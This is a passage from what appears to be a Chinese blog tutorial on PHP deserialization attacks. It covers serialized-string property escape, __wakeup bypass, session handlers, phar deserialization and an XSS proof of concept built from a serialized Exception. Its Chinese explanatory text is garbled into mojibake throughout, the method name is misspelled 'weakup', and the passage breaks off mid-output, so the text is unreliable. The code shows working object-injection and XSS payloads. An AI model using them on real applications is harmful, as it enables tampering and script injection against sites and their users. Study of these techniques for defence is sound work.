class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    __clone test</span><br></pre></td></tr></table></figure><h1 id="å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸"></a>å­—ç¬¦ä¸²é€ƒé€¸</h1><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><ul><li>ååºåˆ—åŒ–åˆ†éš”ç¬¦</li></ul><p>ååºåˆ—åŒ–ä»¥<code>;&#125;</code>ç»“æŸï¼Œåé¢çš„å­—ç¬¦ä¸²ä¸å½±å“æ­£å¸¸çš„ååºåˆ—åŒ–</p><ul><li>å±æ€§é€ƒé€¸</li></ul><p>ä¸€èˆ¬åœ¨æ•°æ®å…ˆç»è¿‡ä¸€æ¬¡<code>serialize</code>åœ¨ç»è¿‡<code>unserialize</code>ï¼Œåœ¨è¿™ä¸ªä¸­é—´ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜å¤šæˆ–è€…å˜å°‘çš„æ—¶å€™å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–å±æ€§é€ƒé€¸</p><h2 id="å­—ç¬¦å‡å°‘"><a href="#å­—ç¬¦å‡å°‘" class="headerlink" title="å­—ç¬¦å‡å°‘"></a>å­—ç¬¦å‡å°‘</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line">    <span class="keyword">object</span>(A)<span class="comment">#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><p>ä¾‹ï¼šåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œé€šè¿‡å­—ç¬¦å‡å°‘çš„æ–¹å¼ï¼Œä½¿ç»“æœå¢åŠ ä¸€ä¸ªå˜é‡<code>v3</code>ï¼Œå…¶å€¼ä¸º<code>666</code></p><p>åˆ›å»ºå¯¹è±¡åçš„<code>$data</code>å€¼ï¼š<code>O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</code></p><p>é€šè¿‡<code>str_replace</code>å¤„ç†åçš„å€¼ï¼š<code>O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> å˜é‡çš„å€¼æ˜¯ç”±å…¶å‰é¢çš„é•¿åº¦æ§åˆ¶çš„ï¼Œåœ¨å¤„ç†åçš„å€¼ä¸­ï¼Œsystem()è¢«æ›¿æ¢ä¸ºç©ºï¼Œå¯¼è‡´v1å€¼çš„é•¿åº¦å’Œå‰é¢å¯¹ä¸ä¸Šï¼Œåœ¨ååºåˆ—åŒ–ä¸­å°±ä¸ä¼šæˆåŠŸã€‚</span></span><br><span class="line"><span class="comment"> æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ§åˆ¶v2çš„æ•°æ®å†…å®¹ï¼Œæ¥åˆ›é€ ä¸€ä¸ªv3çš„å€¼ä¸º666ï¼Œä¸”è¦å°†v1çš„æ•°æ®é•¿åº¦å’Œå†…å®¹ç›¸åŒ¹é…ã€‚</span></span><br><span class="line"><span class="comment"> åœ¨æ„é€ æ—¶è¦æ³¨æ„ç”¨;&#125;æå‰é—­åˆï¼Œæ•°æ®å†…å®¹å’Œé•¿åº¦è¦åŒ¹é…ã€‚</span></span><br><span class="line"><span class="comment"> ç†è®ºæˆåŠŸï¼Œå®è·µå¼€å§‹ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> è§‚å¯Ÿä¸Šè¿°å­—ç¬¦ä¸²å‘ç°v1å€¼é•¿åº¦ä¸º27ï¼Œä½†æ˜¯å…¶çœŸæ­£çš„å†…å®¹åªæœ‰abcï¼Œæ‰€ä»¥ä¼šç»§ç»­åæ‰åé¢çš„æ•°æ®ç›´åˆ°27ä½ä¸ºæ­¢ã€‚</span></span><br><span class="line"><span class="comment"> è€Œæˆ‘ä»¬è¦æ¶æ„æ„é€ çš„å†…å®¹åœ¨v2ä¸­ï¼Œä¸å¦¨ç›´æ¥å°†v2çš„å€¼ä¸å‰é¢åˆ†ç¦»ï¼Œä¾¿äºè§‚å¯Ÿ</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;    123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> å› ä¸ºæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªv3çš„å€¼ä¸º666ï¼Œé€šè¿‡æ”¹å˜v2çš„å€¼æ¥å®ç°ï¼Œæ‰€ä»¥å°†v2çš„å€¼123æ›¿æ¢ä¸º$v3=&quot;666&quot;çš„åºåˆ—åŒ–å†…å®¹,ä¸”è¦å°†åºåˆ—åŒ–å†…å®¹æå‰é—­åˆ</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;    ;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> å‘ç°v2æ”¹å®Œä¹‹åçš„é•¿åº¦ä¸º21ï¼Œå› ä¸ºv1æ•°æ®é•¿åº¦ä¸º27ï¼Œè¿™ä¸ªæ˜¯æ— æ³•æ”¹å˜çš„ï¼Œé€šè¿‡ä¸Šä¸€æ­¥è®¡ç®—å¾—åˆ°v2æ•°æ®çš„é•¿åº¦æ˜¯ä¸ªä¸¤ä½æ•°ï¼Œå‘ç°åˆ°æ„é€ v2æ•°æ®ä¹‹å‰çš„v1çš„å€¼é•¿åº¦ä¸º19ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å…¶è¡¥å…¨ä¸º27ã€‚</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:xx:&quot;1234567&quot;    ;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> å°†v2å†…å®¹è®¡ç®—é•¿åº¦ï¼Œè¡¥å……å®Œæ•´</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> æ­¤æ—¶v1ï¼Œv2çš„å€¼éƒ½ç¡®è®¤ä¸‹æ¥äº†</span></span><br><span class="line"><span class="comment"> - v1 = abcsystem()system()system()</span></span><br><span class="line"><span class="comment"> - v2 = 1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//å°†ä¸Šè¿°çš„å€¼ä¼ å‚è¿›å»ï¼Œå‘ç°å˜é‡v3æˆåŠŸé€ƒé€¸å‡ºæ¥äº†</span></span><br><span class="line"><span class="keyword">object</span>(A)<span class="comment">#1 (3) &#123; [&quot;v1&quot;]=&gt; string(27) &quot;abc&quot;;s:2:&quot;v2&quot;;s:29:&quot;1234567&quot; [&quot;v2&quot;]=&gt; string(3) &quot;123&quot; [&quot;v3&quot;]=&gt; string(3) &quot;666&quot; &#125;</span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦å¢åŠ "><a href="#å­—ç¬¦å¢åŠ " class="headerlink" title="å­—ç¬¦å¢åŠ "></a>å­—ç¬¦å¢åŠ </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$arga</span>,<span class="variable">$argc</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$arga</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v2 = <span class="variable">$argc</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> =  <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line">    <span class="keyword">object</span>(A)<span class="comment">#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><p>ä¾‹ï¼šåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œé€šè¿‡å­—ç¬¦å¢åŠ çš„æ–¹å¼ï¼Œä½¿ç»“æœå¢åŠ ä¸€ä¸ªå˜é‡<code>v3</code>ï¼Œå…¶å€¼ä¸º<code>666</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> è§‚å¯Ÿä»£ç å‘ç°æ¯æœ‰ä¸€ä¸ªlsï¼Œå°±ä¼šè¢«æ›¿æ¢pwdï¼Œä»è€Œä½¿é•¿åº¦é”™è¯¯ï¼Œä¸èƒ½æ‰§è¡Œååºåˆ—åŒ–ã€‚</span></span><br><span class="line"><span class="comment"> æˆ‘ä»¬å¯ä»¥å°†éœ€è¦åˆ›é€ çš„å˜é‡å†™æˆåºåˆ—åŒ–çš„å€¼ï¼Œå°†ä½æ•°è®¡ç®—å‡ºæ¥ï¼Œé€šè¿‡å¤šä¸ªlså°†ä½æ•°è¡¥é½ï¼Œä½¿å…¶ä¸æ›¿æ¢åçš„é•¿åº¦ç›¸åŒã€‚</span></span><br><span class="line"><span class="comment"> å› ä¸ºæ­¤å¤„éœ€è¦æ“ä½œçš„åªæœ‰ä¸€ä¸ªå˜é‡v1ï¼Œæ‰€ä»¥ä¸éœ€è¦ç®¡v2çš„å€¼</span></span><br><span class="line"><span class="comment"> ç†è®ºæˆåŠŸï¼Œå®è·µå¼€å§‹ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> - O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> è§‚å¯Ÿä¸Šè¿°ä»£ç å‘ç°ï¼Œv1æ•°æ®é•¿åº¦ä¸å®é™…é•¿åº¦ä¸åŒ¹é…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©å®ƒæŠŠæˆ‘ä»¬éœ€è¦çš„é•¿åº¦åå‡ºæ¥ï¼Œä»è€Œæ„å»ºæˆ‘ä»¬æ‰€éœ€è¦çš„ä»£ç ã€‚</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> æ„å»ºéœ€è¦åˆ›å»ºçš„å˜é‡å€¼ï¼šå› ä¸ºä¸éœ€è¦è€ƒè™‘v2çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ å®Œæˆåå°±å¯ä»¥åˆ©ç”¨;&#125;ç»“æŸååºåˆ—åŒ–ï¼Œåˆå› ä¸ºï¼Œæˆ‘ä»¬è¦å°†åºåˆ—åŒ–å†…å®¹å•ç‹¬æ‹¿å‡ºæ¥ä½¿å…¶é€ƒé€¸ï¼Œæ‰€ä»¥ç”¨&quot;;éš”æ–­</span></span><br><span class="line"><span class="comment"> - &quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> è®¡ç®—å‘ç°ä¸Šè¿°å†…å®¹é•¿åº¦ä¸º22ï¼Œlsæ˜¯ä¸¤ä½ï¼Œæ›¿æ¢åå˜æˆpwdæ˜¯ä¸‰ä½ï¼Œæ‰€ä»¥ä¼šåå‡ºæ¥ä¸€ä½ï¼Œæˆ‘ä»¬éœ€è¦22ä½ï¼Œæ‰€ä»¥éœ€è¦22ä¸ªlsåŠ ä¸Šä¸Šè¿°åºåˆ—åŒ–å†…å®¹ï¼Œå…¶é•¿åº¦ç­‰äºæ›¿æ¢åçš„22ä¸ªpwdçš„é•¿åº¦ï¼Œäºæ˜¯ï¼Œv3çš„å€¼å°±é€ƒé€¸å‡ºæ¥</span></span><br><span class="line"><span class="comment"> - lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment"> - æ›¿æ¢å‰çš„:</span></span><br><span class="line"><span class="comment"> O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> - æ›¿æ¢åçš„ï¼š</span></span><br><span class="line"><span class="comment"> O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:66:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment"> å¯ä»¥å‘ç°ï¼Œv3çš„å€¼æˆåŠŸé€ƒé€¸å‡ºæ¥äº†</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> - v1=lslslslslslslslslslslslslslslslslslslslslsls&quot;;s:2:&quot;v3&quot;;s:3:&quot;666&quot;;&#125;</span></span><br><span class="line"><span class="comment"> - v2=ä»»æ„å€¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†ä¸Šè¿°çš„å€¼ä¼ å‚è¿›å»ï¼Œå‘ç°å˜é‡v3æˆåŠŸé€ƒé€¸å‡ºæ¥äº†</span></span><br><span class="line"><span class="keyword">object</span>(A)<span class="comment">#1 (3) &#123; [&quot;v1&quot;]=&gt; string(66) &quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot; [&quot;v2&quot;]=&gt; string(3) &quot;123&quot; [&quot;v3&quot;]=&gt; string(3) &quot;666&quot; &#125;</span></span><br></pre></td></tr></table></figure><h1 id="weakupé­”æœ¯æ–¹æ³•ç»•è¿‡"><a href="#weakupé­”æœ¯æ–¹æ³•ç»•è¿‡" class="headerlink" title="weakupé­”æœ¯æ–¹æ³•ç»•è¿‡"></a>weakupé­”æœ¯æ–¹æ³•ç»•è¿‡</h1><h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><blockquote><p>å¦‚æœå­˜åœ¨<code>__weakup</code>æ–¹æ³•ï¼Œè°ƒç”¨<code>unserilize()</code>æ–¹æ³•å‰åˆ™å…ˆè°ƒç”¨<code>weakup</code>æ–¹æ³•ï¼Œä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡<code>__weakup()</code>çš„æ‰§è¡Œ</p></blockquote><h2 id="ç‰ˆæœ¬é™åˆ¶"><a href="#ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="ç‰ˆæœ¬é™åˆ¶"></a>ç‰ˆæœ¬é™åˆ¶</h2><blockquote><p>PHP5&lt;5.6.25</p><p>PHP7&lt;7.0.10</p></blockquote><h1 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><blockquote><p>å½“<code>session_start()</code>è¢«è°ƒç”¨æˆ–è€…<code>php.ini</code>ä¸­<code>session.auto_start</code>ä¸º<strong>1</strong>æ—¶ï¼ŒPHPå†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œè®¿é—®ç”¨æˆ·sessionè¢«åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º<code>/tmp</code>ï¼‰</p></blockquote><h2 id="å­˜å‚¨æ ¼å¼"><a href="#å­˜å‚¨æ ¼å¼" class="headerlink" title="å­˜å‚¨æ ¼å¼"></a>å­˜å‚¨æ ¼å¼</h2><div class="table-container"><table><thead><tr><th>å¤„ç†å™¨</th><th>å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th></tr></thead><tbody><tr><td>php</td><td>é”®åï¼‹ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td></tr><tr><td>php_serialize(php&gt;=5.5.4)</td><td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</td></tr><tr><td>php_binary</td><td>é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡unserialize()å‡½æ•°ååºåˆ—åŒ–å¤„ç†çš„å€¼</td></tr></tbody></table></div><h1 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h1><h2 id="ä»€ä¹ˆæ˜¯phar"><a href="#ä»€ä¹ˆæ˜¯phar" class="headerlink" title="ä»€ä¹ˆæ˜¯phar"></a>ä»€ä¹ˆæ˜¯phar</h2><blockquote><p>PHARæ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶</p><p>å¯¹äºPHP5.3æˆ–æ›´é«˜ç‰ˆæœ¬ï¼ŒPHARåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒã€‚</p><p>æ–‡ä»¶åŒ…å«ï¼špharä¼ªåè®®ï¼Œå¯è¯»å–<code>.phar</code>æ–‡ä»¶</p></blockquote><h2 id="pharç»“æ„"><a href="#pharç»“æ„" class="headerlink" title="pharç»“æ„"></a>pharç»“æ„</h2><blockquote><p><code>stub phar</code>æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º<code>xxx&lt;?php xxx;__HALT_COMPiLER();?&gt;</code>ï¼ˆå¤´éƒ¨ä¿¡æ¯ï¼‰</p><p><code>manifest</code>å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥åºåˆ—åŒ–å­˜å‚¨ï¼›</p><p><code>contents</code>å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›</p><p><code>signature</code>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼›</p><p>Pharåè®®è§£ææ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘å¯¹<code>manifest</code>å­—æ®µçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–</p></blockquote><h2 id="pharä½¿ç”¨æ¡ä»¶"><a href="#pharä½¿ç”¨æ¡ä»¶" class="headerlink" title="pharä½¿ç”¨æ¡ä»¶"></a>pharä½¿ç”¨æ¡ä»¶</h2><blockquote><p>pharæ–‡ä»¶èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p>è¦æœ‰å¯ç”¨åºåˆ—åŒ–é­”æœ¯æ–¹æ³•ä½œä¸ºè·³æ¿</p><p>è¦æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¦‚<code>file_exists()</code>ï¼Œ<code>fopen()</code>ï¼Œ<code>file_get_contents()</code></p><p>æ–‡ä»¶æ“ä½œå‡½æ•°å‚æ•°å¯æ§ï¼Œä¸”<code>: / phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</p></blockquote><h1 id="phpåŸç”Ÿç±»"><a href="#phpåŸç”Ÿç±»" class="headerlink" title="phpåŸç”Ÿç±»"></a>phpåŸç”Ÿç±»</h1><p><strong>å¸¸è§çš„åŸç”Ÿç±»ï¼š</strong></p><ul><li>Error</li><li>Exception</li><li>SoapClient</li><li>DirectoryIterator</li><li>SimpleXMLElement</li></ul><h2 id="Error-Exception-å†…ç½®ç±»è¿›è¡Œ-XSS"><a href="#Error-Exception-å†…ç½®ç±»è¿›è¡Œ-XSS" class="headerlink" title="Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS"></a>Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS</h2><p><code>__toString</code>æ–¹æ³•ä¼šè¿”å›é”™è¯¯æˆ–å¼‚å¸¸çš„å­—ç¬¦ä¸²å½¢å¼ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬è¾“å…¥çš„å‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸²xssä»£ç ï¼Œç»“åˆechoæ¸²æŸ“ï¼Œå°†è§¦å‘åå°„å½¢xssæ¼æ´</p><p><strong>demo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line">O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert%<span class="number">28</span>%<span class="number">271</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span 